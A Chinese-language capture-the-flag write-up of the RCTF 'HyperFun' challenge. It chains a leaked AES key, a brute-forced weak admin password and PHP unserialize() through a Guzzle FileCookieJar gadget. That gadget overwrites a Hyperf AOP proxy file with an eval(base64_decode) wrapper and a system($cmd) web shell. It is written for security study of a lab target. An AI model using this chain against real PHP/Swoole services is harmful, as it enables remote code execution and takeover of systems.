# HyperFun

## 题目简述

题目是运行在 PHP 8.3、Swoole 与 Hyperf 3.1 上的长生命周期 Web 服务。公开接口直接返回 AES 密钥，管理员使用弱口令；登录后的调试接口既能读取项目文件，又把用户数据交给默认启用 `unserialize()` 的解密函数。利用目标是构造 PHP 反序列化文件写 gadget，覆写尚未被某个 worker 加载的 Hyperf AOP 代理类，再通过公开路由执行命令读取 flag。

本题没有收录在总 PDF 中，以下内容依据题目仓库的官方单题 WP、利用脚本和完整源码补全。

## 解题过程

### 取得 AES 密钥并爆破管理员密码

`config/routes.php` 暴露了这些关键路由：

```php
Router::addRoute(['GET', 'POST'], '/api/debug',
    'App\\Controller\\ROISDebugController@debug');
Router::addRoute(['POST'], '/api/login',
    'App\\Controller\\ROISLoginController@login');
Router::addRoute(['GET'], '/api/get_aes_key',
    'App\\Controller\\ROISPublicController@aes_key');
```

`/api/get_aes_key` 直接返回环境变量 `AES_KEY`。登录数据采用 AES-128-CBC：最外层是 Base64 编码的 JSON，JSON 包含 Base64 IV、Base64 密文和 `HMAC-SHA256(key, iv_b64 || value_b64)`。客户端已拿到密钥，完整性校验不能阻止伪造请求。

```python
def encrypt_raw(plaintext: bytes, key_b64: str) -> str:
    key = base64.b64decode(key_b64)
    iv = os.urandom(16)
    ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plaintext, 16))
    iv_b64 = base64.b64encode(iv).decode()
    ct_b64 = base64.b64encode(ct).decode()
    mac = hmac.new(key, (iv_b64 + ct_b64).encode(), hashlib.sha256).hexdigest()
    envelope = json.dumps({"iv": iv_b64, "value": ct_b64, "mac": mac})
    return base64.b64encode(envelope.encode()).decode()
```

逐项加密 `{"username":"admin","password":"<candidate>"}` 并提交 `/api/login`。错误密码返回业务码 `400`，题目字典很快得到：

```text
admin : 123321
```

后续应使用同一个 `requests.Session()` 登录和请求调试接口，让框架自动携带新下发的 `ROIS_SESSION_ID`，不要照抄某次运行中的会话值。

### 确认解密接口就是反序列化入口

管理员可调用 `/api/debug`。`read_file` 分支把文件名拼到 `BASE_PATH`，虽然 `open_basedir` 阻止直接读取根目录 flag，但足以读取 `config/routes.php`、控制器和依赖信息。

更关键的是 `aes_decrypt` 分支：

```php
case 'aes_decrypt': {
    $data = $this->request->input('data', '');
    $decrypt = Crypt::decrypt($data);
    // ...
}
```

题目随附的 `hyperf-ext/encryption` 源码表明，`Crypt::decrypt()` 的第二个参数 `$unserialize` 默认为 `true`，`AesDriver` 解密后直接执行：

```php
return $unserialize ? unserialize($decrypted) : $decrypted;
```

登录接口特意使用 `Crypt::decrypt($data, false)`，调试接口却遗漏了这个参数。因此只要按同一 AES/HMAC 格式加密一段 PHP 序列化数据，就能把任意对象送入 `unserialize()`。

### 从“能写文件”转向 Hyperf 代理缓存

依赖中存在 Monolog 3.9.0 和 Guzzle 7.10.0。Monolog 的文件写链可以验证反序列化确实触发析构逻辑，但其写入方式不适合覆盖已有代理文件。最终使用 `GuzzleHttp\\Cookie\\FileCookieJar`：对象析构时执行 `save($filename)`，最后调用 `file_put_contents($filename, $json, LOCK_EX)`，可以覆盖指定文件。

传统 FPM 每个请求重新载入 PHP 文件，落一个 WebShell 通常就够了；Hyperf/Swoole 的 worker 是长生命周期进程，已经加载的类会常驻内存，直接修改普通控制器源码不会改变当前 worker 的行为。另一方面，Hyperf AOP 会在
`runtime/container/proxy/` 生成代理类，并在 worker 第一次使用对应类时懒加载。题目又启动多个 worker，因此可以覆写某个控制器的代理文件，再等待尚未加载该类的 worker 读取恶意版本。

先用 `read_file` 取得：

```text
runtime/container/proxy/App_Controller_ROISPublicController.proxy.php
```

保持代理类的命名空间、类名、Trait 和构造函数不变，只把公开方法改成命令执行入口，例如：

```php
public function aes_key()
{
    $cmd = $this->request->input('cmd', 'id');
    return $this->response->json(
        \App\Common\Response::json_ok(['res' => system($cmd)])
    );
}
```

把完整代理文件 Base64 编码，落盘内容使用不含反斜杠的短包装器，避免 `FileCookieJar` 的 JSON 编码转义命名空间字符：

```php
<?php eval(base64_decode('<base64-of-modified-proxy>')); ?>
```

构造 `FileCookieJar` 时需要控制三组私有字段：父类 `CookieJar::$cookies` 中放一个可持久化的 `SetCookie`，其 `Value` 为上述 PHP 包装器；子类 `$filename` 指向代理缓存；`$storeSessionCookies` 设为 `true`。对象析构时写出的文件虽然整体是 cookie JSON，但其中的 `<?php ... ?>` 仍会在代理文件被 `include` 时执行。

调用顺序如下：

1. 将该对象序列化；
2. 用公开 AES 密钥按题目格式加密序列化字节；
3. 以管理员会话提交 `option=aes_decrypt`，触发 `unserialize()` 和析构写文件；
4. 反复请求 `/api/get_aes_key?cmd=cat%20/rctf_2025_flag`，直到请求落到尚未缓存 `ROISPublicController` 的 worker。

成功响应中得到：

```text
RCTF{How_u_br0ke_my_l1mit?_Get_0ut!}
```

## 方法总结

利用链分为四层：公开密钥让客户端能够合法伪造密文；弱口令取得管理员会话；默认参数差异把普通解密接口变成 PHP 反序列化入口；最后利用 Guzzle 文件写 gadget 和 Hyperf 多 worker 的代理类懒加载完成代码执行。最容易走偏的地方是拿到文件写后仍按 FPM 思路写 WebShell：面对 Swoole/Hyperf，应先区分“磁盘文件已修改”和“worker 是否还会重新加载该类”，再寻找代理缓存、热更新或尚未加载类等生效点。
